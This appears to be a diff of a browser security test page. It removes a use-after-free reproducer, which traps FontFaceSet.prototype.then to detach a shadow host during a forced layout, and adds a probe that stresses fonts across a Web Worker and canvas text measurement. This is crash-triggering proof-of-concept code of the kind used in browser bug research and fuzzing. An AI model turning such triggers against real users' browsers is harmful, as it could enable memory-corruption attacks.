@@ -1,121 +1,79 @@
 <!DOCTYPE html>
 <html>
 <head>
-<meta charset="utf-8">
-<title>UAF 86074ba — Isolado (offsetWidth)</title>
-<style>
-  body { background: #111; color: #ddd; font-family: monospace; padding: 1em; }
-  pre { font-size: 13px; line-height: 1.45; white-space: pre-wrap; }
-  button { font-family: monospace; padding: 6px 12px; margin-bottom: 12px; cursor: pointer; }
-  .ok { color: #7f7; }
-  .warn { color: #ff7; }
-  .err { color: #f77; }
-</style>
+  <meta charset="utf-8">
+  <title>Worker + Canvas Font Probe</title>
 </head>
 <body>
-<button id="runBtn" type="button">Executar teste isolado</button>
-<pre id="log"></pre>
-<script>
-(function () {
-  "use strict";
+  <button id="runBtn" type="button">Executar teste</button>
+  <pre id="log"></pre>
 
-  var logEl = document.getElementById("log");
-  var runBtn = document.getElementById("runBtn");
-  var executed = false;
-
-  function log(msg, cls) {
-    var span = document.createElement("span");
-    if (cls) span.className = cls;
-    span.textContent = msg + "\n";
-    logEl.appendChild(span);
-  }
-
-  function makeFontCss(url) {
-    return (
-      "@font-face{font-family:'pf';src:url('" + url + "')}" +
-      ":host>span{font-family:'pf';font-size:20px;display:block}"
-    );
-  }
-
-  function runTest() {
-    if (executed) {
-      log("Teste ja executado nesta pagina. Recarregue para repetir.", "warn");
-      return;
+  <script>
+    const logEl = document.getElementById('log');
+    function log(msg) {
+      logEl.textContent += msg + '\n';
     }
-    executed = true;
 
-    log("=== Inicio do teste isolado ===");
+    const canvas = document.createElement('canvas');
+    canvas.width = 64;
+    canvas.height = 64;
+    const ctx = canvas.getContext('2d');
 
-    var pre = document.createElement("div");
-    document.body.appendChild(pre);
-    pre.attachShadow({ mode: "open" });
+    const workerCode = `
+      self.onmessage = function(ev) {
+        const hasFonts = typeof self.fonts !== 'undefined';
+        const hasFontFace = typeof self.FontFace !== 'undefined';
+        const hasOffscreen = typeof self.OffscreenCanvas !== 'undefined';
+        let added = 0;
 
-    var shadowHost = document.createElement("div");
-    document.body.appendChild(shadowHost);
-    var sr = shadowHost.attachShadow({ mode: "open" });
+        if (hasFonts && hasFontFace) {
+          const tinyFontUrl = 'url("data:font/ttf;base64,AAEAAAASAQAABAAgR0RFRr==")';
+          for (let i = 0; i < 16; i++) {
+            try {
+              const ff = new FontFace('wFont' + i, tinyFontUrl);
+              self.fonts.add(ff);
+              added++;
+            } catch (e) {
+              break;
+            }
+          }
+        }
 
-    var style1 = document.createElement("style");
-    style1.textContent = makeFontCss("resources/Ahem.woff?v=1");
-    sr.appendChild(style1);
+        self.postMessage({
+          step: ev.data.step,
+          hasFonts: hasFonts,
+          hasFontFace: hasFontFace,
+          hasOffscreen: hasOffscreen,
+          added: added
+        });
+      };
+    `;
 
-    var span = document.createElement("span");
-    span.textContent = "X";
-    sr.appendChild(span);
+    const blob = new Blob([workerCode], { type: 'application/javascript' });
+    const workerUrl = URL.createObjectURL(blob);
+    const worker = new Worker(workerUrl);
 
-    var suf = document.createElement("div");
-    document.body.appendChild(suf);
-    suf.attachShadow({ mode: "open" });
+    worker.onmessage = function(ev) {
+      log('Worker msg: ' + JSON.stringify(ev.data));
+      if (ctx) {
+        for (let i = 0; i < 60; i++) {
+          ctx.font = (10 + (i % 15)) + 'px "wFont' + (i % 16) + '", sans-serif';
+          ctx.measureText('\u13A0\u13A2\u13A4');
+        }
+        log('Main-thread measureText concluido no passo ' + ev.data.step);
+      }
+    };
 
-    void shadowHost.getBoundingClientRect();
-    log("[1] getBoundingClientRect() executado", "ok");
+    worker.onerror = function(err) {
+      log('Worker error: ' + (err.message || 'erro'));
+    };
 
-    var fs = document.fonts;
-    log("[2] fonts.status inicial = " + fs.status, fs.status === "loading" ? "ok" : "warn");
-
-    void fs.ready;
-    log("[3] fs.ready acessado; status = " + fs.status);
-
-    var trapFired = false;
-    var connectedBefore = null;
-    var connectedAfter = null;
-    var srHostAfter = null;
-
-    Object.defineProperty(FontFaceSet.prototype, "then", {
-      configurable: true,
-      get: function () {
-        trapFired = true;
-        connectedBefore = shadowHost.isConnected;
-        log("[TRAP] FontFaceSet.prototype.then getter chamado | host.isConnected antes = " + connectedBefore, "warn");
-        shadowHost.remove();
-        connectedAfter = shadowHost.isConnected;
-        srHostAfter = sr.host ? sr.host.tagName : null;
-        log("[TRAP] shadowHost.remove() executado | host.isConnected depois = " + connectedAfter + " | sr.host = " + srHostAfter, "warn");
-        return undefined;
+    document.getElementById('runBtn').addEventListener('click', function() {
+      log('Disparando passos...');
+      for (let s = 0; s < 5; s++) {
+        worker.postMessage({ step: s });
       }
     });
-    log("[4] Getter de FontFaceSet.prototype.then instalado", "ok");
-
-    var style2 = document.createElement("style");
-    style2.textContent = makeFontCss("resources/Ahem.woff?v=2");
-    sr.prepend(style2);
-    log("[5] style2 (?v=2) inserido via prepend()", "ok");
-
-    log("[6] Disparando document.body.offsetWidth ...", "ok");
-    void document.body.offsetWidth;
-
-    try { delete FontFaceSet.prototype.then; } catch (e) {}
-
-    log("=== Fim do passo [6] ===");
-    log("trapFired = " + trapFired, trapFired ? "ok" : "err");
-    log("host.isConnected: antes=" + connectedBefore + " -> depois=" + connectedAfter + " | sr.host=" + srHostAfter);
-    log("fonts.status final = " + fs.status);
-  }
-
-  runBtn.addEventListener("click", runTest);
-  window.addEventListener("load", function () {
-    setTimeout(runTest, 0);
-  });
-})();
-</script>
+  </script>
 </body>
 </html>
